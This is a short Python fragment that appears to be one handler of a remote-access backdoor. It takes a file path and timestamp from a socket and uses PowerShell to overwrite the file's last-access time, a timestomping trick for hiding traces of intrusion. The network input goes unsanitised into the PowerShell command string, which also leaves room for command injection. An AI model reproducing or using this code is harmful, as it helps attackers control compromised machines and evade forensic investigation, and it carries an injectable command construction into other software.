
import os
import subprocess

editfile = receive(client_socket).decode()
edittime = receive(client_socket).decode()
if os.path.exists(editfile):
    cmd ='powershell "Get-ChildItem \'%s\' | %% { $_.LastAccessTime = \'%s\' }"' % (editfile,edittime)
    resp = run_command(cmd)
else:
    resp = "[!] {}: No such file or directory\n".format(editfile)
send(client_socket,resp)
